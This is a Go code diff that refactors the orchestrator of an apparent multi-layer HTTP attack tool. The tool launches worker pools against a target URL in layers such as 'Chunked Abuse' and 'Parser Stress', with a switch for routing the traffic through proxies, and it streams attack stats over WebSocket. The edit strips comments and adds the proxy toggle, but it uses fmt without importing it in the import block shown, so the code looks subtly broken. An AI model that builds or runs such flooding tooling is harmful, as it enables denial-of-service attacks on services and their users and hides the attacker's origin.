@@ -4,33 +4,32 @@ import (
 	"context"
 	"crypto/rand"
 	"encoding/hex"
-  "encoding/json"
+	"encoding/json"
 	"log"
 	"net/url"
 	"sync"
 	"time"
 )
 
-// Orchestrator manages the entire multi-layer attack lifecycle.
 type Orchestrator struct {
-	id        string
-	target    *url.URL
-	layers    LayerWorkers
-	duration  time.Duration
-	proxyMgr  *ProxyManager
-	hub       *WebSocketHub
-	cfg       *Config
+	id       string
+	target   *url.URL
+	layers   LayerWorkers
+	duration time.Duration
+	proxyMgr *ProxyManager
+	hub      *WebSocketHub
+	cfg      *Config
+	useProxy bool
 
 	stats  *Stats
 	ctx    context.Context
 	cancel context.CancelFunc
 	wg     sync.WaitGroup
 
-	mu       sync.Mutex
-	running  bool
+	mu      sync.Mutex
+	running bool
 }
 
-// NewOrchestrator creates a new attack orchestrator.
 func NewOrchestrator(
 	target *url.URL,
 	layers LayerWorkers,
@@ -38,9 +37,17 @@ func NewOrchestrator(
 	proxyMgr *ProxyManager,
 	hub *WebSocketHub,
 	cfg *Config,
+	useProxy bool,
 ) *Orchestrator {
 	ctx, cancel := context.WithCancel(context.Background())
 	id := generateID()
+
+	if !useProxy {
+		proxyMgr.enabled = false
+		log.Printf("[orch] Proxy disabled for attack %s", id)
+	} else {
+		proxyMgr.enabled = true
+	}
 
 	return &Orchestrator{
 		id:       id,
@@ -50,19 +57,15 @@ func NewOrchestrator(
 		proxyMgr: proxyMgr,
 		hub:      hub,
 		cfg:      cfg,
+		useProxy: useProxy,
 		stats:    NewStats(),
 		ctx:      ctx,
 		cancel:   cancel,
 	}
 }
 
-// ID returns the unique attack identifier.
-func (o *Orchestrator) ID() string { return o.id }
-
-// Target returns the target URL string.
+func (o *Orchestrator) ID() string    { return o.id }
 func (o *Orchestrator) Target() string { return o.target.String() }
-
-// UptimeMs returns milliseconds since the attack started.
 func (o *Orchestrator) UptimeMs() int64 {
 	o.mu.Lock()
 	defer o.mu.Unlock()
@@ -71,13 +74,8 @@ func (o *Orchestrator) UptimeMs() int64 {
 	}
 	return time.Since(o.stats.StartTime).Milliseconds()
 }
+func (o *Orchestrator) StatsSnapshot() StatsSnapshot { return o.stats.Snapshot() }
 
-// StatsSnapshot returns a point-in-time snapshot of stats.
-func (o *Orchestrator) StatsSnapshot() StatsSnapshot {
-	return o.stats.Snapshot()
-}
-
-// Start begins the multi-layer attack.
 func (o *Orchestrator) Start() {
 	o.mu.Lock()
 	if o.running {
@@ -88,21 +86,18 @@ func (o *Orchestrator) Start() {
 	o.stats.StartTime = time.Now()
 	o.mu.Unlock()
 
-	log.Printf("[orch] Attack %s starting against %s", o.id, o.target.String())
-	o.hub.BroadcastLog("success", "Attack started: "+o.id)
+	log.Printf("[orch] Attack %s starting against %s (proxy: %v)", o.id, o.target.String(), o.useProxy)
+	o.hub.BroadcastLog("success", fmt.Sprintf("Attack started: %s (Proxy: %v)", o.id, o.useProxy))
 	o.hub.BroadcastLog("info", "Target: "+o.target.String())
 
-	// Start stats reporter goroutine
 	o.wg.Add(1)
 	go o.statsReporter()
 
-	// Create a timer for the overall duration
 	var timer <-chan time.Time
 	if o.duration > 0 {
 		timer = time.After(o.duration)
 	}
 
-	// Launch all layers
 	o.wg.Add(1)
 	go o.launchLayer("L1 - Chunked Abuse", o.layers.L1, layer1Chunked, timer)
 	o.wg.Add(1)
@@ -114,7 +109,6 @@ func (o *Orchestrator) Start() {
 	o.wg.Add(1)
 	go o.launchLayer("L5 - Parser Stress", o.layers.L5, layer5ParserStress, timer)
 
-	// Wait for all layers to finish
 	o.wg.Wait()
 
 	o.mu.Lock()
@@ -124,7 +118,6 @@ func (o *Orchestrator) Start() {
 	log.Printf("[orch] Attack %s finished", o.id)
 }
 
-// Stop gracefully terminates the attack.
 func (o *Orchestrator) Stop() {
 	o.mu.Lock()
 	defer o.mu.Unlock()
@@ -137,7 +130,6 @@ func (o *Orchestrator) Stop() {
 	log.Printf("[orch] Attack %s cancelled", o.id)
 }
 
-// launchLayer starts a single attack layer with a worker pool.
 func (o *Orchestrator) launchLayer(
 	name string,
 	workerCount int,
@@ -146,12 +138,10 @@ func (o *Orchestrator) launchLayer(
 ) {
 	defer o.wg.Done()
 
-	// Create a semaphore channel to limit concurrency
 	sem := make(chan struct{}, workerCount)
 	layerCtx, layerCancel := context.WithCancel(o.ctx)
 	defer layerCancel()
 
-	// If timer fires, cancel this layer
 	go func() {
 		if timer != nil {
 			<-timer
@@ -159,7 +149,7 @@ func (o *Orchestrator) launchLayer(
 		}
 	}()
 
-	o.hub.BroadcastLog("info", name+": Launching "+intToStr(workerCount)+" workers")
+	o.hub.BroadcastLog("info", fmt.Sprintf("%s: Launching %d workers", name, workerCount))
 
 	for i := 0; i < workerCount; i++ {
 		select {
@@ -174,7 +164,6 @@ func (o *Orchestrator) launchLayer(
 			defer func() { <-sem }()
 
 			o.stats.ActiveWorkers.Add(1)
-			// Update per-layer active count
 			layerIdx := getLayerIndex(name)
 			if layerIdx >= 0 && layerIdx < 5 {
 				o.stats.Layers[layerIdx].ActiveWorkers.Add(1)
@@ -194,12 +183,10 @@ func (o *Orchestrator) launchLayer(
 		}(i)
 	}
 
-	// Wait for context cancellation
 	<-layerCtx.Done()
 	o.hub.BroadcastLog("info", name+": Layer stopped")
 }
 
-// statsReporter broadcasts stats to the WebSocket hub every 500ms.
 func (o *Orchestrator) statsReporter() {
 	defer o.wg.Done()
 	ticker := time.NewTicker(500 * time.Millisecond)
